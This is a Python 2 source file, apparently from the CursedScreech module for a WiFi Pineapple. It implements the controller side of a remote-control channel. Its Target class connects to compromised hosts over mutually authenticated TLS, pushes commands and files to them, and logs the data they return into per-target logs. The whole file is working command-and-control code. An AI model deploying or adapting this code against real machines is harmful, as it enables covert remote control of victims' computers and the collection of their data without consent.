from ssl import *
from socket import *
import time
import os

# Pull settings from file
settingsFile = "/pineapple/modules/CursedScreech/includes/forest/settings"
targetLogLocation = "/pineapple/modules/CursedScreech/includes/forest/targetlogs/"
activity_log = priv_key = pub_cer = client_key = client_serial = ""
settings = {}
with open(settingsFile, "r") as sFile:
	for line in sFile:
		params = line.strip("\n").split("=")
		if params[0] == "activity_log":
			activity_log = params[1]
		elif params[0] == "kuro_key":
			priv_key = params[1] + ".key"
			pub_cer = params[1] + ".cer"
		elif params[0] == "target_key":
			client_key = params[1] + ".cer"
		elif params[0] == "client_serial":
			client_serial = params[1]
		else:
			pass

def logActivity(msg):
	with open(activity_log, "a") as log:
		log.write(msg + "\n")
		
def logReceivedData(data, file):
	with open(targetLogLocation + file, "a+") as tLog:
		tLog.write(data + "\n")

class Target:
	def __init__(self,addr=None,port=None):
		self.addr = addr
		self.port = int(port)
		self.socket = None
		self.msg = ""
		self.recvData = ""
		self.connected = False
		self.lastSeen = time.time()

	def secureConnect(self):
		print "[>] Connecting to " + self.sockName()
		logActivity("[>] Connecting to " + self.sockName())

		try:
			sck = socket(AF_INET, SOCK_STREAM)
			self.socket = wrap_socket(sck, ssl_version=PROTOCOL_SSLv23, keyfile=priv_key, certfile=pub_cer, cert_reqs=CERT_REQUIRED, ca_certs=client_key)
			self.socket.settimeout(10)
			self.socket.connect((self.addr,self.port))
			self.socket.settimeout(None)
		
			# Fetch the target's certificate to verify their identity
			cert = self.socket.getpeercert()
			if not cert['serialNumber'] == client_serial:
				logActivity("[-] Certificate serial number doesn't match.")
				self.disconnect()
			else:
				print "[+] Connected to " + self.sockName() + " via " + self.socket.version()
				logActivity("[+] Connected to " + self.sockName() + " via " + self.socket.version())
				self.connected = True
				
		except error as sockerror:
			logActivity("[!] Failed to connect to " + self.sockName())
			self.connected = False

	def send(self, data):
		if self.isConnected():
		
			if "sendfile;" in data:
				dataParts = data.split(";")
				filePath = dataParts[1]
				storeDir = dataParts[2]
				self.socket.sendall("sendfile;" + os.path.basename(filePath) + ";" + str(os.path.getsize(filePath)) + ";" + storeDir)
				with open(filePath, "rb") as f:
					self.socket.sendall(f.read())
					logActivity("[!] File sent to " + self.sockName())
			else:
				self.socket.sendall(data.encode())
				logActivity("[!] Command sent to " + self.sockName())
				logReceivedData(data, self.addr)
			
		
	def recv(self):
		try:
			d = self.socket.recv(4096)
			self.recvData = d.decode()
		
			if not self.recvData:
				self.disconnect()
				return
			
			logReceivedData(self.recvData, self.addr)
			logActivity("[+] Data received from: " + self.sockName())
		
		except KeyboardInterrupt:
			return
				
		except:
			self.disconnect()
			
	def isConnected(self):
		return self.connected
	
	def sockName(self):
		return self.addr + ":" + str(self.port)
	
	def disconnect(self):
		logActivity("[!] Closing connection to " + self.sockName())
		try:
			self.socket.shutdown(SHUT_RDWR)
		except:
			pass
		self.socket.close()
		self.connected = False
		
	def setPort(self, port):
		self.port = int(port)
		
	def isMissing(self, limit):
		if time.time() - self.lastSeen > limit:
			return True
		else:
			return False